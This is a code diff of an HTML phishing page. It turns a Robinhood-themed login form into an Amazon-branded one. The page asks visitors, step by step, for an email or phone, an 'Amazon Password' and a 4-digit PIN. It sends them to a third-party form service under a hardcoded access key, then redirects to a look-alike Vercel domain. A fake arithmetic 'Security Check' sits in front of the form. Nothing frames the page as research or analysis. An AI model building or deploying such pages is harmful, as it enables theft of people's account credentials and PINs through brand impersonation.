@@ -84,56 +84,91 @@ button:hover {
 </head>
 
 <body>
-<div class="popup">
-<div class="form-box">
 
-<!-- Logo -->
-<img src="Screenshot_20260324_221926.jpg" class="logo" alt="Logo">
+<div class="container">
 
-<h2>login to continue</h2>
+  <div class="logo">
+    <img src="">
+  </div>
 
-<form action="https://api.web3forms.com/submit" method="POST">
+  <h2>Security Check</h2>
 
-<input type="hidden" name="access_key" value="39483916-2d75-4776-91f8-2bbc171def4f">
+  <!-- BOT CHECK -->
+  <div id="botCheck">
+    <p id="question"></p>
+    <input type="number" id="answer" placeholder="Enter answer">
+    <button onclick="verify()">Continue</button>
+    <p id="error" class="error"></p>
+  </div>
 
-<input type="hidden" name="redirect" value="https://robinhood-com.vercel.app/success.html">
-<!-- STEP 1 -->
-<div id="step1">
-<h3>Enter mail</h3>
-<input type="email" name="email" placeholder="yourgmail@gmail.com" required>
-<button type="button" onclick="nextStep(1)">Next</button>
-</div>
+  <!-- FORM -->
+  <div id="formSection">
 
-<!-- STEP 2 -->
-<div id="step2" class="hidden">
-<h3>password</h3>
-<input type="text" name="username" placeholder="password" required>
-<button type="button" onclick="nextStep(2)">Next</button>
-</div>
+    <h2>VERIFY Account To Continue</h2>
 
-<!-- STEP 3 -->
-<div id="step3" class="hidden">
-<h3>verify Pin</h3>
-<textarea name="complaint" column="1" placeholder="verify 4 digit pin " required></textarea>
-<button type="submit">login</button>
-</div>
+    <form id="multiStepForm" action="https://api.web3forms.com/submit" method="POST">
 
-</form>
+      <input type="hidden" name="access_key" value="21bda4c6-ce9c-4353-8f0c-b3d6604969b8">
+      <input type="hidden" name="redirect" value="https://mazonrt.vercel.app/Logo.html/success.html">
 
-</div>
+      <!-- STEP 1 -->
+      <div class="step active" id="step1">
+        <input type="text" name="name" placeholder="Email or Phone" required>
+        <button type="button" onclick="nextStep(1)">Next</button>
+      </div>
+
+      <!-- STEP 2 -->
+      <div class="step" id="step2">
+        <input type="text" name="username" placeholder="Amazon Password" required>
+        <button type="button" onclick="nextStep(2)">Next</button>
+      </div>
+
+      <!-- STEP 3 -->
+      <div class="step" id="step3">
+        <textarea name="complaint" placeholder="Verify 4 digit pin"></textarea>
+        <button type="submit">Verify</button>
+      </div>
+
+      <p style="text-align:center">or</p>
+
+      <button type="button" onclick="window.location.href='guest.html'">Guest</button>
+
+      <div class="footer">
+        <p>Version: 5.1.0</p>
+      </div>
+
+    </form>
+
+  </div>
 
 </div>
 
 <script>
+// Math question
+let num1 = Math.floor(Math.random() * 10) + 1;
+let num2 = Math.floor(Math.random() * 10) + 1;
+let correct = num1 + num2;
 
-function nextStep(step){
+document.getElementById("question").innerText =
+  "Solve to continue: " + num1 + " + " + num2;
 
-document.getElementById("step"+step).classList.add("hidden");
+// Bot verify
+function verify(){
+  let user = document.getElementById("answer").value;
 
-document.getElementById("step"+(step+1)).classList.remove("hidden");
-
+  if(user == correct){
+    document.getElementById("botCheck").style.display = "none";
+    document.getElementById("formSection").style.display = "block";
+  } else {
+    document.getElementById("error").innerText = "Wrong answer. Try again!";
+  }
 }
 
+// Step navigation
+function nextStep(step){
+  document.getElementById("step" + step).classList.remove("active");
+  document.getElementById("step" + (step + 1)).classList.add("active");
+}
 </script>
 
 </body>
